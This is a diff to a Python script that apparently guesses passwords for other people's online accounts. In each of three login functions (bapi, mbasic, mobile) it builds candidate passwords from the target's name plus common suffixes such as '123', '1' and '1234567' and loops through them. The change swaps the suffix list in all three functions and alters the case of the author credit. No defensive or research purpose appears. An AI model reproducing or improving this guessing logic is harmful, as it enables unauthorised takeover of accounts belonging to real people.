@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by Wahid Baloch
+# author by wahid baloch
 import os
 try:
 	import requests
@@ -297,7 +297,7 @@ def bapi(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"0786", name+"1" ]
+		pwx = [ name+"1", name+"1234567" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -338,7 +338,7 @@ def mbasic(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"0786", name+"1" ]
+		pwx = [ name+"1", name+"1234567" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -390,7 +390,7 @@ def mobile(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"0786", name+"1" ]
+		pwx = [ name+"1", name+"1234567" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
